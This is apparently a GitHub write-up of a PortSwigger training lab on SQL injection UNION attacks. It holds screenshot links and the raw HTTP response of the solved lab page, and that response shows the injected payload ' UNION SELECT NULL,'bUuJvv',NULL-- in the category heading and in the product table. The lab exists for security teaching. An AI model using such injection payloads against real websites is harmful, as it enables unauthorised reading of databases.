# lab-2Lab-SQL-injection-
SQL injection UNION attack, finding a column containing text

assssdddsds
![image](https://user-images.githubusercontent.com/70814577/112753712-721f4e80-8fe1-11eb-90fc-f7a241d413f6.png)
![image](https://user-images.githubusercontent.com/70814577/112753727-82cfc480-8fe1-11eb-927c-cf7a96a9d8e3.png)
![image](https://user-images.githubusercontent.com/70814577/112753736-90854a00-8fe1-11eb-86a9-edeb5b54fa9c.png)
![image](https://user-images.githubusercontent.com/70814577/112753741-99761b80-8fe1-11eb-8e6c-5c57ab90813e.png)
![image](https://user-images.githubusercontent.com/70814577/112753924-67b18480-8fe2-11eb-997c-a4289fad96db.png)
![image](https://user-images.githubusercontent.com/70814577/112753942-7e57db80-8fe2-11eb-9035-e9564115a75d.png)
![image](https://user-images.githubusercontent.com/70814577/112753975-aa735c80-8fe2-11eb-9127-7c8004af912a.png)
![image](https://user-images.githubusercontent.com/70814577/112753992-c70f9480-8fe2-11eb-89a1-59be26d58943.png)
![image](https://user-images.githubusercontent.com/70814577/112754004-d42c8380-8fe2-11eb-82b9-340d2b95db0c.png)
![image](https://user-images.githubusercontent.com/70814577/112754042-06d67c00-8fe3-11eb-9875-e761cc821003.png)
![image](https://user-images.githubusercontent.com/70814577/112754074-279ed180-8fe3-11eb-8133-61b190d8323d.png)

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 6858

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection UNION attack, finding a column containing text</title>
    </head>
    <body>
            <script src="/resources/labheader/js/labHeader.js"></script>
            
            <div id="academyLabHeader">
                <section class="academyLabBanner is-solved">
                    <div class="container">
                    <div class="logo"></div>
                        <div class="title-container">
                            <h2>SQL injection UNION attack, finding a column containing text</h2>
                            <a class="link-back" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 28 30" enable-background="new 0 0 28 30" xml:space="preserve" title="back-arrow">
    <g>
        <polygon points="1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15"></polygon>
        <polygon points="14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15"></polygon>
    </g>
</svg>
                            </a>
                        </div>
                        <div class="widgetcontainer-lab-status is-solved">
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class="lab-status-icon"></span>
                        </div>
                    </div>
                </section>
                <section id="notification-labsolved" class="notification-labsolved-hidden">
                    <div class="container">
                        <h4>Congratulations, you solved the lab!</h4>
                        <div>
                            <a class="button" href="https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aSQL+injection+UNION+attack%2c+finding+a+column+containing+text%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fsql-injection%2funion-attacks%2flab-find-column-containing-text&related=WebSecAcademy,Burp_Suite">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20.44" height="17.72" viewBox="0 0 20.44 17.72">
                        <title>twitter-button</title>
                        <path d="M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z"></path>
                    </svg>
                                Share your skills!
                            </a>
                            <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">
                                Continue learning 
                                <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 28 30" enable-background="new 0 0 28 30" xml:space="preserve" title="back-arrow">
                                    <g>
                                        <polygon points="1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15"></polygon>
                                        <polygon points="14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15"></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                    </div>
                </section>

            <script src="/resources/labheader/js/completedLabHeader.js"></script>            </div>

        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="ecoms-pageheader">
                        <h1>Clothing, shoes and accessories&apos; UNION SELECT NULL,&apos;bUuJvv&apos;,NULL--</h1>
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a href="/">All</a>
                        <a href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
                        <a href="/filter?category=Food+%26+Drink">Food & Drink</a>
                        <a href="/filter?category=Gifts">Gifts</a>
                        <a href="/filter?category=Pets">Pets</a>
                        <a href="/filter?category=Tech+gifts">Tech gifts</a>
                    </section>
                    <table class="is-table-numbers">
                        <tbody>
                        <tr>
                            <th>Baby Minding Shoes</th>
                            <td>$70.74</td>
                            <td><a class="button is-small" href="/product?productId=2">View details</a></td>
                        </tr>
                        <tr>
                            <th>The Alternative Christmas Tree</th>
                            <td>$31.90</td>
                            <td><a class="button is-small" href="/product?productId=7">View details</a></td>
                        </tr>
                        <tr>
                            <th>Paddling Pool Shoes</th>
                            <td>$65.73</td>
                            <td><a class="button is-small" href="/product?productId=12">View details</a></td>
                        </tr>
                        <tr>
                            <th>Portable Hat</th>
                            <td>$89.67</td>
                            <td><a class="button is-small" href="/product?productId=17">View details</a></td>
                        </tr>
                        <tr>
                            <th>bUuJvv</th>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </section>
        </div>
    </body>
</html>
